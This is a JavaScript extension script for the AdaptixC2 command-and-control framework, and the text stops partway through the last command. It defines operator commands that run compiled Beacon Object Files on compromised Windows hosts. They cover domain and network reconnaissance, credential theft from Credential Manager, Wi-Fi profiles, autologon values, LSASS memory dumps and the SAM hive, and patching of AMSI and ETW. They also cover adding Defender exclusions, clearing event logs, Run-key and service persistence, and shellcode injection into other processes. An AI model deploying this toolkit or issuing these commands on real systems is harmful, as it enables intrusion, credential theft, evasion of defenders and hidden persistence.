/*
 * AdaptixBOFKit - AdaptixC2 AxScript extension
 *
 * Load this file from the client: Main menu -> AxScript -> Script manager
 * -> Context menu -> Load new -> AdaptixBOFKit.axs
 *
 * The BOF objects are expected in ./_bin/<name>.<arch>.o next to this file.
 */

var metadata = {
    name: "AdaptixBOFKit",
    description: "Recon, AD, credential, evasion, persistence and utility BOFs",
    store: true
};

function bof_path(id, name) {
    return ax.script_dir() + "_bin/" + name + "." + ax.arch(id) + ".o";
}

/* ------------------------------------------------------------------ */
/* Recon / situational awareness                                       */
/* ------------------------------------------------------------------ */

var cmd_whoami = ax.create_command("bof-whoami", "Show user, SID, groups and token privileges", "bof-whoami");
cmd_whoami.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "whoami")}"`, "BOF: whoami");
});

var cmd_env = ax.create_command("bof-env", "List process environment variables", "bof-env");
cmd_env.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "env")}"`, "BOF: env");
});

var cmd_ipconfig = ax.create_command("bof-ipconfig", "Show IPv4 adapters, gateways and DNS servers", "bof-ipconfig");
cmd_ipconfig.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "ipconfig")}"`, "BOF: ipconfig");
});

var cmd_arp = ax.create_command("bof-arp", "Dump the ARP table", "bof-arp");
cmd_arp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "arp")}"`, "BOF: arp");
});

var cmd_netstat = ax.create_command("bof-netstat", "Show TCP and UDP endpoints", "bof-netstat");
cmd_netstat.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netstat")}"`, "BOF: netstat");
});

var cmd_routeprint = ax.create_command("bof-routeprint", "Show the IPv4 routing table", "bof-routeprint");
cmd_routeprint.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "routeprint")}"`, "BOF: routeprint");
});

var cmd_uptime = ax.create_command("bof-uptime", "Show boot time and system uptime", "bof-uptime");
cmd_uptime.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "uptime")}"`, "BOF: uptime");
});

var cmd_listpipes = ax.create_command("bof-listpipes", "List named pipes", "bof-listpipes");
cmd_listpipes.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "listpipes")}"`, "BOF: listpipes");
});

var cmd_drives = ax.create_command("bof-drives", "List logical drives with type and free space", "bof-drives");
cmd_drives.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "drives")}"`, "BOF: drives");
});

var cmd_locale = ax.create_command("bof-locale", "Show system and user locale information", "bof-locale");
cmd_locale.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "locale")}"`, "BOF: locale");
});

var cmd_resources = ax.create_command("bof-resources", "Show memory, CPU and disk resources", "bof-resources");
cmd_resources.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "resources")}"`, "BOF: resources");
});

var cmd_windowlist = ax.create_command("bof-windowlist", "List visible windows and their PIDs", "bof-windowlist");
cmd_windowlist.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "windowlist")}"`, "BOF: windowlist");
});

var cmd_listmods = ax.create_command("bof-listmods", "List modules loaded in a process (0 = current)", "bof-listmods 1234");
cmd_listmods.addArgInt("pid", "Process ID (0 = current process)", 0);
cmd_listmods.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("int", [parsed_json["pid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "listmods")}" ${params}`, "BOF: listmods");
});

var cmd_sessions = ax.create_command("bof-sessions", "Enumerate local and RDP sessions", "bof-sessions");
cmd_sessions.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "sessions")}"`, "BOF: sessions");
});

var cmd_dir = ax.create_command("bof-dir", "List a directory, optionally recursively", "bof-dir C:\\Windows /s");
cmd_dir.addArgString("directory", "Directory to list", ".\\");
cmd_dir.addArgBool("/s", "Recurse into subdirectories");
cmd_dir.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("wstr,int", [parsed_json["directory"], parsed_json["/s"] ? 1 : 0]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "dir")}" ${params}`, "BOF: dir");
});

var cmd_proclist = ax.create_command("bof-proclist", "List processes with PID, PPID and image path", "bof-proclist");
cmd_proclist.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "proclist")}"`, "BOF: proclist");
});

var cmd_services = ax.create_command("bof-services", "Enumerate Win32 services", "bof-services");
cmd_services.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "services")}"`, "BOF: services");
});

var cmd_drivers = ax.create_command("bof-drivers", "Enumerate kernel drivers registered with SCM", "bof-drivers");
cmd_drivers.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "drivers")}"`, "BOF: drivers");
});

/* ------------------------------------------------------------------ */
/* Network                                                             */
/* ------------------------------------------------------------------ */

var cmd_portscan = ax.create_command("bof-portscan", "TCP connect scan of an IPv4 host", "bof-portscan 192.168.1.10 22,80,443,445,3389");
cmd_portscan.addArgString("target", true, "Target IPv4 address");
cmd_portscan.addArgString("ports", true, "Ports: 80 or 80,443,22-25");
cmd_portscan.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["target"], parsed_json["ports"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "portscan")}" ${params}`, "BOF: portscan");
});

var cmd_nslookup = ax.create_command("bof-nslookup", "Query DNS records", "bof-nslookup example.com -t A -s 8.8.8.8");
cmd_nslookup.addArgString("domain", true, "Name to resolve");
cmd_nslookup.addArgFlagString("-t", "type", "Record type: A, AAAA, CNAME, MX, NS, PTR, TXT, SRV, SOA, ANY", "A");
cmd_nslookup.addArgFlagString("-s", "server", "DNS server (default: system resolver)", "");
cmd_nslookup.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["domain"], parsed_json["type"], parsed_json["server"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "nslookup")}" ${params}`, "BOF: nslookup");
});

var cmd_netshares = ax.create_command("bof-netshares", "Enumerate SMB shares on a host", "bof-netshares 192.168.1.10");
cmd_netshares.addArgString("host", "Hostname or IP (empty = localhost)", "");
cmd_netshares.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netshares")}" ${params}`, "BOF: netshares");
});

var cmd_netview = ax.create_command("bof-netview", "List computers visible in a domain", "bof-netview CORP.LOCAL");
cmd_netview.addArgString("domain", "Domain name (empty = current domain)", "");
cmd_netview.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netview")}" ${params}`, "BOF: netview");
});

var cmd_netuse = ax.create_command("bof-netuse", "Map a remote SMB share", "bof-netuse \\\\192.168.1.10\\C$ CORP\\user password");
cmd_netuse.addArgString("share", true, "UNC path, e.g. \\\\host\\share");
cmd_netuse.addArgString("user", "Username", "");
cmd_netuse.addArgString("password", "Password", "");
cmd_netuse.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["share"], parsed_json["user"], parsed_json["password"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netuse")}" ${params}`, "BOF: netuse");
});

var cmd_netuse_list = ax.create_command("bof-netuse-list", "List mapped network resources", "bof-netuse-list");
cmd_netuse_list.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netuse-list")}"`, "BOF: netuse-list");
});

var cmd_nettime = ax.create_command("bof-nettime", "Read the clock of a remote machine", "bof-nettime 192.168.1.10");
cmd_nettime.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_nettime.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "nettime")}" ${params}`, "BOF: nettime");
});

var cmd_netloggedon = ax.create_command("bof-netloggedon", "Enumerate users logged on to a machine", "bof-netloggedon 192.168.1.10");
cmd_netloggedon.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_netloggedon.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netloggedon")}" ${params}`, "BOF: netloggedon");
});

var cmd_netsession = ax.create_command("bof-netsession", "Enumerate SMB sessions on a machine", "bof-netsession 192.168.1.10");
cmd_netsession.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_netsession.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netsession")}" ${params}`, "BOF: netsession");
});

/* ------------------------------------------------------------------ */
/* Active Directory / accounts                                         */
/* ------------------------------------------------------------------ */

var cmd_netuser = ax.create_command("bof-netuser", "Show detailed user account information", "bof-netuser administrator CORP");
cmd_netuser.addArgString("user", true, "Username");
cmd_netuser.addArgString("domain", "Domain or server (empty = local)", "");
cmd_netuser.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["user"], parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netuser")}" ${params}`, "BOF: netuser");
});

var cmd_netlocalgroups = ax.create_command("bof-netlocalgroups", "Enumerate local groups", "bof-netlocalgroups 192.168.1.10");
cmd_netlocalgroups.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_netlocalgroups.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netlocalgroups")}" ${params}`, "BOF: netlocalgroups");
});

var cmd_netlocalgroupmembers = ax.create_command("bof-netlocalgroupmembers", "Enumerate members of a local group", "bof-netlocalgroupmembers Administrators 192.168.1.10");
cmd_netlocalgroupmembers.addArgString("group", true, "Local group name");
cmd_netlocalgroupmembers.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_netlocalgroupmembers.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["group"], parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netlocalgroupmembers")}" ${params}`, "BOF: netlocalgroupmembers");
});

var cmd_domaingroups = ax.create_command("bof-domaingroups", "Enumerate domain global groups", "bof-domaingroups CORP");
cmd_domaingroups.addArgString("domain", "Domain name (empty = current)", "");
cmd_domaingroups.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "domaingroups")}" ${params}`, "BOF: domaingroups");
});

var cmd_netgroupmembers = ax.create_command("bof-netgroupmembers", "Enumerate members of a domain global group", "bof-netgroupmembers Domain Admins CORP");
cmd_netgroupmembers.addArgString("group", true, "Group name");
cmd_netgroupmembers.addArgString("domain", "Domain name (empty = current)", "");
cmd_netgroupmembers.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["group"], parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netgroupmembers")}" ${params}`, "BOF: netgroupmembers");
});

var cmd_passwordpolicy = ax.create_command("bof-passwordpolicy", "Show password and lockout policy", "bof-passwordpolicy CORP");
cmd_passwordpolicy.addArgString("domain", "Domain name (empty = local)", "");
cmd_passwordpolicy.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "passwordpolicy")}" ${params}`, "BOF: passwordpolicy");
});

var cmd_domaininfo = ax.create_command("bof-domaininfo", "Show join status, FQDN and domain controller", "bof-domaininfo");
cmd_domaininfo.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "domaininfo")}"`, "BOF: domaininfo");
});

/* ------------------------------------------------------------------ */
/* Credentials                                                         */
/* ------------------------------------------------------------------ */

var cmd_credman = ax.create_command("bof-credman", "Dump Windows Credential Manager entries", "bof-credman");
cmd_credman.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "credman")}"`, "BOF: credman");
});

var cmd_wifi = ax.create_command("bof-wifi", "List wireless profiles and recover plaintext keys", "bof-wifi");
cmd_wifi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "wifi")}"`, "BOF: wifi");
});

var cmd_autologon = ax.create_command("bof-autologon", "Read Winlogon autologon credentials from the registry", "bof-autologon");
cmd_autologon.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "autologon")}"`, "BOF: autologon");
});

/* ------------------------------------------------------------------ */
/* Privilege / evasion                                                 */
/* ------------------------------------------------------------------ */

var cmd_tokenpriv = ax.create_command("bof-tokenpriv", "List token privileges or enable one", "bof-tokenpriv SeDebugPrivilege");
cmd_tokenpriv.addArgString("privilege", "Privilege to enable (empty = list all)", "");
cmd_tokenpriv.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["privilege"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "tokenpriv")}" ${params}`, "BOF: tokenpriv");
});

var cmd_uacstatus = ax.create_command("bof-uacstatus", "Inspect UAC registry configuration", "bof-uacstatus");
cmd_uacstatus.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "uacstatus")}"`, "BOF: uacstatus");
});

var cmd_unhook = ax.create_command("bof-unhook", "Restore ntdll executable sections from disk", "bof-unhook");
cmd_unhook.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "unhook")}"`, "BOF: unhook");
});

var cmd_etwpatch = ax.create_command("bof-etwpatch", "Patch ntdll!EtwEventWrite", "bof-etwpatch");
cmd_etwpatch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "etwpatch")}"`, "BOF: etwpatch");
});

var cmd_amsipatch = ax.create_command("bof-amsipatch", "Patch amsi!AmsiScanBuffer", "bof-amsipatch");
cmd_amsipatch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "amsipatch")}"`, "BOF: amsipatch");
});

var cmd_hidefile = ax.create_command("bof-hidefile", "Mark a file or directory hidden + system", "bof-hidefile C:\\Temp\\payload.exe");
cmd_hidefile.addArgString("path", true, "File or directory path");
cmd_hidefile.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "hidefile")}" ${params}`, "BOF: hidefile");
});

var cmd_cleareventlog = ax.create_command("bof-cleareventlog", "Clear Application, System and Security logs", "bof-cleareventlog");
cmd_cleareventlog.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "cleareventlog")}"`, "BOF: cleareventlog");
});

var cmd_addexclusion = ax.create_command("bof-add-exclusion", "Add a Microsoft Defender path exclusion", "bof-add-exclusion C:\\Temp");
cmd_addexclusion.addArgString("path", true, "Path to exclude");
cmd_addexclusion.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "add-exclusion")}" ${params}`, "BOF: add-exclusion");
});

/* ------------------------------------------------------------------ */
/* Registry / persistence                                              */
/* ------------------------------------------------------------------ */

var cmd_regquery = ax.create_command("bof-regquery", "Query a registry key or value", "bof-regquery HKLM SOFTWARE\\Microsoft\\Windows\\CurrentVersion Run");
cmd_regquery.addArgString("hive", true, "HKLM, HKCU, HKCR, HKU or HKCC");
cmd_regquery.addArgString("path", true, "Key path");
cmd_regquery.addArgString("value", "Value name (empty = enumerate values)", "");
cmd_regquery.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["hive"], parsed_json["path"], parsed_json["value"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "regquery")}" ${params}`, "BOF: regquery");
});

var cmd_regset = ax.create_command("bof-regset", "Create or set a REG_SZ registry value", "bof-regset HKCU Software\\Test value data");
cmd_regset.addArgString("hive", true, "HKLM, HKCU, HKCR, HKU or HKCC");
cmd_regset.addArgString("path", true, "Key path");
cmd_regset.addArgString("value", true, "Value name");
cmd_regset.addArgString("data", true, "String data");
cmd_regset.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", [parsed_json["hive"], parsed_json["path"], parsed_json["value"], parsed_json["data"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "regset")}" ${params}`, "BOF: regset");
});

var cmd_regdelete = ax.create_command("bof-regdelete", "Delete a registry value or empty key", "bof-regdelete HKCU Software\\Test value");
cmd_regdelete.addArgString("hive", true, "HKLM, HKCU, HKCR, HKU or HKCC");
cmd_regdelete.addArgString("path", true, "Key path");
cmd_regdelete.addArgString("value", "Value name (empty = delete key)", "");
cmd_regdelete.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["hive"], parsed_json["path"], parsed_json["value"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "regdelete")}" ${params}`, "BOF: regdelete");
});

var cmd_runkey = ax.create_command("bof-runkey", "Add HKCU Run key persistence", "bof-runkey Updater C:\\Users\\Public\\updater.exe");
cmd_runkey.addArgString("name", true, "Value name");
cmd_runkey.addArgString("command", true, "Command to run at logon");
cmd_runkey.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["name"], parsed_json["command"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "runkey")}" ${params}`, "BOF: runkey");
});

var cmd_svccreate = ax.create_command("bof-svc-create", "Create and start a Windows service", "bof-svc-create Updater C:\\Users\\Public\\updater.exe");
cmd_svccreate.addArgString("name", true, "Service name");
cmd_svccreate.addArgString("path", true, "Binary path");
cmd_svccreate.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["name"], parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "svc-create")}" ${params}`, "BOF: svc-create");
});

var cmd_svcdelete = ax.create_command("bof-svc-delete", "Delete a Windows service", "bof-svc-delete Updater");
cmd_svcdelete.addArgString("name", true, "Service name");
cmd_svcdelete.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["name"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "svc-delete")}" ${params}`, "BOF: svc-delete");
});

/* ------------------------------------------------------------------ */
/* Execution / post exploitation                                       */
/* ------------------------------------------------------------------ */

var cmd_inject = ax.create_command("bof-inject", "Inject raw shellcode from a local file", "bof-inject 1234 C:\\Temp\\payload.bin");
cmd_inject.addArgInt("pid", true, "Target process ID");
cmd_inject.addArgString("path", true, "Local shellcode file on the target");
cmd_inject.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("int,cstr", [parsed_json["pid"], parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "inject")}" ${params}`, "BOF: inject");
});

var cmd_hashfile = ax.create_command("bof-hashfile", "Hash a file (MD5, SHA1 or SHA256)", "bof-hashfile C:\\Windows\\System32\\ntdll.dll -a sha256");
cmd_hashfile.addArgString("path", true, "File path");
cmd_hashfile.addArgFlagString("-a", "algo", "Algorithm: md5, sha1 or sha256", "sha256");
cmd_hashfile.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["path"], parsed_json["algo"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "hashfile")}" ${params}`, "BOF: hashfile");
});

var cmd_download = ax.create_command("bof-download", "Download a file via AxDownloadMemory (built-in download is chunked and preferred)", "bof-download C:\\Temp\\output.txt");
cmd_download.addArgString("path", true, "Remote file path");
cmd_download.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "download")}" ${params}`, "BOF: download");
});

/* ------------------------------------------------------------------ */
/* Extended catalog coverage                                           */
/* ------------------------------------------------------------------ */

var cmd_useridletime = ax.create_command("bof-useridletime", "Seconds since the last user input in this session", "bof-useridletime");
cmd_useridletime.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "useridletime")}"`, "BOF: useridletime");
});

var cmd_sessioninfo = ax.create_command("bof-sessioninfo", "Current logon session details from LSA", "bof-sessioninfo");
cmd_sessioninfo.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "sessioninfo")}"`, "BOF: sessioninfo");
});

var cmd_regqueryrec = ax.create_command("bof-regqueryrec", "Recursively dump a registry key", "bof-regqueryrec HKLM SOFTWARE\\Microsoft\\Windows\\CurrentVersion 2");
cmd_regqueryrec.addArgString("hive", true, "Hive: HKLM, HKCU, HKU, HKCR, HKCC");
cmd_regqueryrec.addArgString("path", true, "Key path");
cmd_regqueryrec.addArgInt("depth", "Maximum recursion depth", 3);
cmd_regqueryrec.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,int", [parsed_json["hive"], parsed_json["path"], parsed_json["depth"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "regqueryrec")}" ${params}`, "BOF: regqueryrec");
});

var cmd_auditpol = ax.create_command("bof-auditpol", "Show advanced audit policy subcategories", "bof-auditpol");
cmd_auditpol.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "auditpol")}"`, "BOF: auditpol");
});

var cmd_findmodule = ax.create_command("bof-findmodule", "Find processes that have a DLL loaded", "bof-findmodule csagent.dll");
cmd_findmodule.addArgString("module", true, "Module name or path substring");
cmd_findmodule.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["module"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "findmodule")}" ${params}`, "BOF: findmodule");
});

var cmd_filterdrivers = ax.create_command("bof-filterdrivers", "List filesystem minifilter drivers", "bof-filterdrivers");
cmd_filterdrivers.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "filterdrivers")}"`, "BOF: filterdrivers");
});

var cmd_scenum = ax.create_command("bof-scenum", "Service details or a full service table", "bof-scenum WinDefend");
cmd_scenum.addArgString("service", "Service name (empty = list all)", "");
cmd_scenum.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["service"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "scenum")}" ${params}`, "BOF: scenum");
});

var cmd_regsession = ax.create_command("bof-regsession", "Loaded user hives from HKEY_USERS", "bof-regsession");
cmd_regsession.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "regsession")}"`, "BOF: regsession");
});

var cmd_edrrecon = ax.create_command("bof-edrrecon", "Match services/drivers against known EDR and AV names", "bof-edrrecon");
cmd_edrrecon.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "edrrecon")}"`, "BOF: edrrecon");
});

var cmd_enumsysmon = ax.create_command("bof-enumsysmon", "Detect Sysmon service, driver and configuration", "bof-enumsysmon");
cmd_enumsysmon.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enumsysmon")}"`, "BOF: enumsysmon");
});

var cmd_enumwebclient = ax.create_command("bof-enumwebclient", "Check the WebClient (WebDAV) service", "bof-enumwebclient 192.168.1.10");
cmd_enumwebclient.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_enumwebclient.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enumwebclient")}" ${params}`, "BOF: enumwebclient");
});

var cmd_whereami = ax.create_command("bof-whereami", "OPSEC-safe process/session context", "bof-whereami");
cmd_whereami.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "whereami")}"`, "BOF: whereami");
});

var cmd_enumrwx = ax.create_command("bof-enumrwx", "List RWX memory regions in a process", "bof-enumrwx 1234");
cmd_enumrwx.addArgInt("pid", "Process ID (0 = current process)", 0);
cmd_enumrwx.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("int", [parsed_json["pid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enumrwx")}" ${params}`, "BOF: enumrwx");
});

var cmd_vulndrivers = ax.create_command("bof-vulndrivers", "Flag installed drivers with known-vulnerable names", "bof-vulndrivers");
cmd_vulndrivers.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "vulndrivers")}"`, "BOF: vulndrivers");
});

var cmd_enumdotnet = ax.create_command("bof-enumdotnet", "Processes with the CLR loaded", "bof-enumdotnet");
cmd_enumdotnet.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enumdotnet")}"`, "BOF: enumdotnet");
});

var cmd_safeharbor = ax.create_command("bof-safeharbor", "Candidate low-noise injection targets", "bof-safeharbor");
cmd_safeharbor.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "safeharbor")}"`, "BOF: safeharbor");
});

var cmd_listdns = ax.create_command("bof-listdns", "Dump the DNS client resolver cache", "bof-listdns");
cmd_listdns.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "listdns")}"`, "BOF: listdns");
});

var cmd_probe = ax.create_command("bof-probe", "Check a single TCP port", "bof-probe 10.0.0.5 445");
cmd_probe.addArgString("host", true, "Hostname or IP");
cmd_probe.addArgString("port", true, "TCP port");
cmd_probe.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["host"], parsed_json["port"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "probe")}" ${params}`, "BOF: probe");
});

var cmd_smbinfo = ax.create_command("bof-smbinfo", "Workstation/SMB info via NetWkstaGetInfo", "bof-smbinfo 192.168.1.10");
cmd_smbinfo.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_smbinfo.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "smbinfo")}" ${params}`, "BOF: smbinfo");
});

var cmd_procdump = ax.create_command("bof-procdump", "MiniDumpWriteDump a process", "bof-procdump 644 C:\\Temp\\lsass.dmp");
cmd_procdump.addArgInt("pid", true, "Target process ID");
cmd_procdump.addArgString("output", "Output file (empty = %TEMP%\\bof_<pid>.dmp)", "");
cmd_procdump.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("int,cstr", [parsed_json["pid"], parsed_json["output"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "procdump")}" ${params}`, "BOF: procdump");
});

var cmd_regsave = ax.create_command("bof-regsave", "Save a registry hive with backup privilege", "bof-regsave HKLM SAM C:\\Temp\\sam.hive");
